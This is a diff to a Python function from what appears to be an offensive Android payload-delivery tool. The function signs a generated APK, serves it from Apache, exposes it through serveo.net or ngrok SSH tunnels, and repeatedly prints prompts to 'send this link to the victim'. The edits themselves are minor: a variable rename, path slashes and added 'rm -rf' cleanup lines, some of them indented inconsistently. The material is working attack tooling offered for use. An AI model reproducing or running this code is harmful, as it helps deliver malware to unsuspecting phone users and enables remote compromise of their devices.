@@ -99,8 +99,8 @@ def venom():
 	        os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
 	        print("")
 	        print(f"{output}/{name} has been created successfully .......")
-	        link=input("DO YOU WANT TO SEND THE PAYLOAD VIA A LINK?[Y/n] : ")
-	        if link=="y" or link=="Y":
+	        link1=input("DO YOU WANT TO SEND THE PAYLOAD VIA A LINK?[Y/n] : ")
+	        if link1=="y" or link1=="Y":
 		             print("C-A-U-T-I-O-N :CLOSING THIS WINDOW COULD STOP PORT FORWARDING AND SERVER..")
 		             print("")
 		             print("[1] custom domain   [2] default domain")
@@ -112,12 +112,14 @@ def venom():
 			               os.system("service apache2 start") 
 			               print(f"send this link to the victim >>> {dn}.serveo.net/{name}")
 			               os.system(f"ssh -R {port}:{ip}:{port} serveo.net -R  {dn}.serveo.net:80:localhost:80")
+				       os.system(f"rm -rf /var/www/html/{name}") 
 		             else:
 			                print(f"using DEFAULT url > https://febrev.serveo.net/{name} <<send this link to victim")
 			                os.system(f"cp {output}/{name} /var/www/html/")
 			                os.system("service apache2 start") 
 			                print("SERVER AND PORT FORWARDING ENABLED.....")
 			                os.system(f"ssh -R {port}:{ip}:{port} serveo.net -R  febrev.serveo.net:80:localhost:80")
+					os.system(f"rm -rf /var/www/html/{name}") 
 					exit()
 	        else:
 		           print("PORT FORWARDING ENABLED>>>>>>>>>>")
@@ -137,7 +139,7 @@ def venom():
       print("[2]GENERATE CUSTOM LINK URL VIA SERVEO.NET(the best ever method)")
       link=int(input("ENTER YOUR CHOICE : "))
       if link==1:
-            os.system(f"cp {output}/{name} /var/www/html")
+            os.system(f"cp {output}/{name} /var/www/html/")
             print("SERVER STARTED......")
             print(f" COPY THE LINK BELOW AND ADD ' /{name}  AND SEND THE LINK URL TO YOUR VICTIM")
             print(f" <link>/{name}  ")
@@ -172,7 +174,7 @@ def venom():
                    os.system("./ngrok http 80")
                    print("#######HAPPY HACKING#############")
       elif link==2:
-           os.system(f"cp {output}/{name} /var/www/html")
+           os.system(f"cp {output}/{name} /var/www/html/")
            print("[1] DEFAULT URL (https://frvenom.serveo.net)")
            print("[2] MAKE YOUR OWN CUSTOM DOMAIN NAME(eg:https://yourname.serveo.net)")
            serveo=int(input("Enter the choice: "))
@@ -194,7 +196,7 @@ def venom():
                os.system("ssh -R frvenom.serveo.net:80:localhost:80 serveo.net")
                print("#######HAPPY HACKING#############")
       else:
-           os.system(f"cp {output}/{name} /var/www/html")
+           os.system(f"cp {output}/{name} /var/www/html/")
            print("NO INPUT ENTERED BY USER,,,,,,USING DEFAULT URL....")
            print("SEND THE BELOW URL TO THE VICTIM....>>")
            print(f"https://frvenom.serveo.net/{name}")
